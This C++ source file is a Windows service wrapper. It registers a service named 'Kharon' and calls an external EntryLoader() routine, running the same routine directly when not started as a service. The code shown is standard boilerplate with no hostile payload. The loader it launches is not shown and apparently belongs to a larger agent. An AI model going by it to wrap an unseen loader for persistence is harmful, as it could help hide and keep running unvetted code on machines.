#include <Kharon.h>

SERVICE_STATUS              ServiceStatus       = {0};
SERVICE_STATUS_HANDLE       ServiceStatusHandle = NULL;

VOID WINAPI ServiceMain( DWORD argc, LPWSTR *argv );
VOID WINAPI ServiceCtrlHandler( ULONG Ctrl );
VOID RunKharon( VOID );

VOID WINAPI ServiceCtrlHandler( ULONG Ctrl ) {
    switch ( Ctrl ) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus( ServiceStatusHandle, &ServiceStatus );
            return;

        case SERVICE_CONTROL_INTERROGATE:
            break;

        default:
            break;
    }

    SetServiceStatus( ServiceStatusHandle, &ServiceStatus );
}

VOID RunKharon( VOID ) {
    EntryLoader();
}

VOID WINAPI ServiceMain( DWORD argc, LPWSTR *argv ) {
    ServiceStatusHandle = RegisterServiceCtrlHandlerW( L"Kharon", ServiceCtrlHandler );

    if ( !ServiceStatusHandle ) return;

    ServiceStatus.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState            = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode           = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint              = 0;
    ServiceStatus.dwWaitHint                = 3000;

    SetServiceStatus( ServiceStatusHandle, &ServiceStatus );

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwWaitHint     = 0;
    SetServiceStatus( ServiceStatusHandle, &ServiceStatus );

    RunKharon();

    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus( ServiceStatusHandle, &ServiceStatus );
}

auto WINAPI WinMain(
    _In_ HINSTANCE Instance,
    _In_ HINSTANCE PrevInstance,
    _In_ LPSTR     CommandLine,
    _In_ INT32     ShowCmd
) -> INT32 {
    SERVICE_TABLE_ENTRYW ServiceTable[] = { { (LPWSTR)L"Kharon", ServiceMain }, { nullptr, nullptr } };

    if ( !StartServiceCtrlDispatcherW( ServiceTable ) ) {
        RunKharon();
    }

    return 0;
}